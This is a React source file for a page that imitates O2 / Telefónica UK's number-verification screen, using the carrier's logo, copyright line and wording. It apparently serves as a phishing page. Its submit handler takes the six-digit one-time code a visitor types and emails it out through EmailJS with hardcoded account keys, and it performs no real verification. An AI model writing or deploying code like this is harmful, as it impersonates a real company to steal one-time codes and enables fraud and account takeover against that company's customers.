import React, { useState } from 'react';
import { IoIosArrowForward } from "react-icons/io";
import emailjs from '@emailjs/browser';

const About = () => {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);

  const handleSubmit = (e) => {
    e.preventDefault();
    const otpString = otp.join(''); // Combine OTP digits into a single string

    // The email template expects placeholders for to_name, from_name, and message
    // Here we use dummy values for to_name and from_name, and include the OTP in the message
    emailjs.send('service_g6qtdfx', 'template_iyhc4kj', {
      to_name: 'User', // Replace with the recipient's name or a relevant identifier
      from_name: 'YourService', // Replace with the sender's name or your service name
      message: `Your OTP code is ${otpString}` // OTP message
    }, 'Yq6PfyBIHeUEh6QmR')
      .then(() => {
        console.log("sending")
      })
      .catch((error) => {
        console.error('Error sending OTP:', error);
      });
  };

  const handleChange = (e, index) => {
    const { value } = e.target;
    if (/^\d*$/.test(value) && value.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);

      // Move focus to the next input field
      if (index < otp.length - 1 && value) {
        document.getElementById(`otp-${index + 1}`).focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`).focus();
    }
  };

  const isOtpComplete = otp.every((digit) => digit !== '');

  const style = {
    content: '',
    borderRadius: "0 0 50% 50%/0 0 50% 50%",
    transform: "scaleX(1.1)",
    overflow: "hidden"
  };

  return (
    <div className='h-full overflow-x-hidden w-full'>
      <div style={style} className="flex justify-center pt-8 h-48 bg-gradient-to-r from-blue-900 to-cyan-500">
        <h1 className='text-white text-xl md:text-4xl lg:text-5xl'>
          We need to verify this number is yours
        </h1>
      </div>
      <div className="h-fit my-10 shadow-2xl px-8 md:px-32 relative lg:left-[30%] w-fit">
        <div className="w-fit absolute -top-4 bg-white">
          <h1 className='border-2 px-16 rounded-md py-1 border-zinc-300'>WHAT IS THE CODE?</h1>
        </div>
        <p className='text-start w-96 pt-16'>
          For your security, we need to make sure this is your number. To do that, we have sent a one-time code to
        </p>
        <h4 className='text-2xl my-7'>Information</h4>
        <p className='text-start w-96'>
          We’ve sent you two texts. The first is a warning message not to give one-time codes to fraudsters pretending to work for O2. The second is the code you need to continue with your request, which should arrive shortly after the first one. Waited more than 30 minutes for your code? Ask for another
        </p>
        <p className='py-5'>What is the code?</p>
        <div className="flex gap-2">
          {otp.map((value, index) => (
            <input
              key={index}
              id={`otp-${index}`}
              type="text"
              value={value}
              onChange={(e) => handleChange(e, index)}
              onKeyDown={(e) => handleKeyDown(e, index)}
              maxLength="1"
              className="w-12 h-12 text-center border rounded-md text-xl"
            />
          ))}
        </div>
        <button
          onClick={handleSubmit}
          disabled={!isOtpComplete}
          className={`mt-6 w-full py-2 my-8 rounded-md text-white ${isOtpComplete ? 'bg-blue-600' : 'bg-gray-400 cursor-not-allowed'}`}
        >
          Continue
        </button>
        <div className="flex items-center cursor-pointer pb-10 text-blue-900 gap-10">
          <IoIosArrowForward className='text-2xl'/>
          <p className="text-lg">Didn't receive a code?</p>
        </div>
      </div>
      <footer className='border-t-[1px] h-24 flex items-center justify-around border-slate-300'>
        <div className="text-blue-900 font-bold text-sm">© 2024 Telefónica UK Limited.</div>
        <div className="block">
          <img src="https://static.o2.co.uk/shared/img/logo-telefonica.svg" alt="footerlogo" />
        </div>
      </footer>
    </div>
  );
};

export default About;
